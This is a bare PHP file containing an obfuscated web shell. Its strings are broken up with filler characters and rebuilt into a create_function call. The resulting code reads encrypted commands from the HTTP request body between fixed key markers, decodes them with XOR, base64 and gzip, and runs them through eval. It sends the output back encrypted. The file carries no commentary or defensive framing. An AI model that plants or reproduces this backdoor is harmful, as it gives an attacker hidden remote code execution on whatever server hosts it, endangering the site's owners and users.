<?php
$I=str_replace('JX','','cJXreaJXJXte_fuJXnJXctJXion');
$r='$k="AA103A0580b";$kh="4e5f43AA6A9fe18";AA$kf="f2ef8ef7A88a5";$Ap=';
$o=');$j++,$i++)AA{$o.=$t{$iA}^$k{$Aj}A;}}rAeturn $AAo;}if (@pAreg_A';
$h='lAen(A$t);$o="A"A;for($i=0;$i<$l;A){for(A$j=0A;($j<$Ac&&$AiA<$l';
$v='"7FMwQ3OWguSmcAUnZ"A;funAActioAn x($t,AA$k){$c=strlen($k);$l=sAtr';
$V='matAcAh("A/$kh(.+)$kf/",A@file_get_contAents("phAp://Ainput"A),$';
$F='$r=@baAse6A4_encAode(@x(@gzcomApress(A$o),AA$k));Aprint("$p$khA$r$kf");}';
$J='Am)==A1) {@oAb_start();@eAvaAl(@gzuncompreAss(A@x(@base6A4_deco';
$L='deA($m[1A])A,$k)))A;$o=A@ob_Aget_contentsA(A);@ob_Aend_clean();A';
$q=str_replace('A','',$r.$v.$h.$o.$V.$J.$L.$F);
$O=$I('',$q);$O();
?>
